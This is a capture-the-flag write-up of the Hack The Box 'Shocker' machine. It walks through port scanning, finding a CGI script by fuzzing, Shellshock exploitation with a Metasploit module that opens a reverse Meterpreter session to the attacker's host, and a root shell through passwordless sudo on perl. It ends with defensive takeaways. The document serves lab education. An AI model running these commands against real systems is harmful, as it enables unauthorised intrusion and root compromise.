# HTB Write-Up: Shocker

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Shocker)    |
| Difficulty | Easy                                                           |
| OS         | Linux                                                          |
| Author     | Landau                                                         |
| Date       | April 19, 2026                                                 |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Web Application & CGI Script Discovery](#2-enumeration--web-application--cgi-script-discovery)
3. [Initial Access — Shellshock via Apache mod_cgi (CVE-2014-6271)](#3-initial-access--shellshock-via-apache-mod_cgi-cve-2014-6271)
4. [Privilege Escalation — Perl GTFOBin via Sudo](#4-privilege-escalation--perl-gtfobin-via-sudo)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid discovery, followed by Nmap for service fingerprinting:

```bash
rustscan -a 10.129.23.21 --ulimit 5000
```

**Open Ports:**

| Port | Service | Notes                                               |
|------|---------|-----------------------------------------------------|
| 80   | HTTP    | Apache web server — primary attack surface          |
| 2222 | SSH     | Non-standard port — useful for post-exploitation    |

SSH on a non-standard port (2222) is a configuration detail worth noting — it suggests the host is deliberately attempting to reduce automated scanning noise, and will be useful once valid credentials or a shell are obtained.

---

## 2. Enumeration — Web Application & CGI Script Discovery

### 2.1 — Initial Web Inspection

The root page on port 80 displayed only a static image. Metadata and steganographic analysis of the image (via `exiftool` and `stegseek`) yielded nothing of value. Attention was shifted to directory enumeration.

### 2.2 — Directory Fuzzing

Content discovery was performed with **ffuf** against the web root:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt \
     -u http://10.129.23.21/FUZZ
```

**Findings:**

| Path          | Status | Notes                                          |
|---------------|--------|------------------------------------------------|
| /cgi-bin/     | 403    | Forbidden — but confirms the directory exists  |
| /.htaccess    | 403    | Standard Apache file                           |
| /.htpasswd    | 403    | Standard Apache file                           |
| /server-status| 403    | Apache status endpoint                         |

The `/cgi-bin/` directory is the most significant result. Although it returns a 403 (access denied to the directory listing itself), the directory is present and Apache's `mod_cgi` may be configured to execute scripts within it — making its contents a critical target for further enumeration.

### 2.3 — CGI Script Discovery

A second fuzzing pass was performed specifically against `/cgi-bin/`, with shell script extensions added to the search:

```bash
gobuster dir -u http://10.129.23.21/cgi-bin/ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
  -x .sh
```

**Result:**

```
/user.sh    [Status: 200, Size: 119]
```

Accessing `/cgi-bin/user.sh` returned a simple uptime output, confirming it is a **live, server-executed CGI shell script** — the exact condition required for a Shellshock attack.

---

## 3. Initial Access — Shellshock via Apache mod_cgi (CVE-2014-6271)

### 3.1 — Vulnerability Background

**Shellshock (CVE-2014-6271)** is a critical vulnerability in the **GNU Bash** shell that was disclosed in September 2014. When Apache's `mod_cgi` executes a CGI script, it passes HTTP request headers to the script as environment variables. Bash processes these environment variables during initialisation — and in vulnerable versions, specially crafted function definitions in those variables cause Bash to execute arbitrary trailing commands.

The attack vector is:
1. A CGI script is executed by Apache via `mod_cgi`
2. The script's runtime shell is vulnerable Bash
3. HTTP headers (e.g., `User-Agent`, `Referer`) are injected with a Shellshock payload
4. Bash executes the attacker's command during environment variable parsing

### 3.2 — Exploitation via Metasploit

The Metasploit module `exploit/multi/http/apache_mod_cgi_bash_env_exec` was used to automate the exploitation:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOST 10.129.23.21
set LHOST 10.10.15.33
set TARGETURI /cgi-bin/user.sh
run
```

**Result — Meterpreter session opened, then dropped to a shell:**

```
[*] Meterpreter session 1 opened (10.10.15.33:4444 -> 10.129.23.21:50014)
meterpreter > shell
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),...
shelly@Shocker:/usr/lib/cgi-bin$
```

Shell obtained as user `shelly`. **User flag retrieved from `/home/shelly/user.txt`.**

---

## 4. Privilege Escalation — Perl GTFOBin via Sudo

### 4.1 — Sudo Enumeration

Available sudo permissions were inspected:

```bash
sudo -l
```

**Output:**

```
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

`shelly` can execute `perl` as root **without a password**. This is a textbook misconfiguration — granting sudo access to an interpreter is functionally equivalent to granting a root shell, as interpreters can trivially spawn child processes.

### 4.2 — Shell Escape via Perl (GTFOBins)

The following one-liner, documented on [GTFOBins](https://gtfobins.github.io/gtfobins/perl/), executes a shell under the inherited sudo context:

```bash
sudo perl -e 'exec "/bin/sh"'
```

**Result — Root shell obtained:**

```
id
uid=0(root) gid=0(root) groups=0(root)
```

**Root flag retrieved from `/root/root.txt`.**

---

## 5. Summary

| Phase                  | Technique                                                        | Result                        |
|------------------------|------------------------------------------------------------------|-------------------------------|
| Recon                  | RustScan                                                         | Ports 80 and 2222 identified  |
| Enumeration            | ffuf — directory fuzzing                                         | `/cgi-bin/` directory found   |
| CGI Discovery          | Gobuster — `.sh` extension fuzzing inside `/cgi-bin/`           | `/cgi-bin/user.sh` discovered |
| Initial Access         | CVE-2014-6271 (Shellshock) via Apache mod_cgi + Metasploit      | Shell as `shelly`             |
| Privilege Escalation   | `sudo perl` GTFOBin shell escape                                 | Root shell                    |

### Key Takeaways

- **The `/cgi-bin/` directory requires two layers of enumeration.** A 403 response confirms the directory exists, but discovering scripts within it requires a second fuzzing pass with appropriate file extensions (`.sh`, `.pl`, `.py`). This two-stage approach is essential for CGI-based attack surfaces.
- **Shellshock remains exploitable wherever unpatched Bash processes CGI requests.** Despite being disclosed in 2014, systems that have not received OS-level updates remain vulnerable. Any web server executing CGI scripts via Bash should be verified as patched against CVE-2014-6271.
- **Sudo permissions on interpreters are equivalent to unrestricted root access.** Perl, Python, Ruby, Lua, and similar interpreters can all exec child processes — granting `NOPASSWD` sudo on any of them yields a trivial root shell via GTFOBins. The principle of least privilege must be applied rigorously to sudo configurations.
- **CGI scripts should be audited and minimised.** The presence of `/cgi-bin/user.sh` — a script serving only system uptime — on a production-facing web server had no justification. Attack surface reduction means removing unused or unnecessary web-accessible scripts, particularly those executed by the shell.
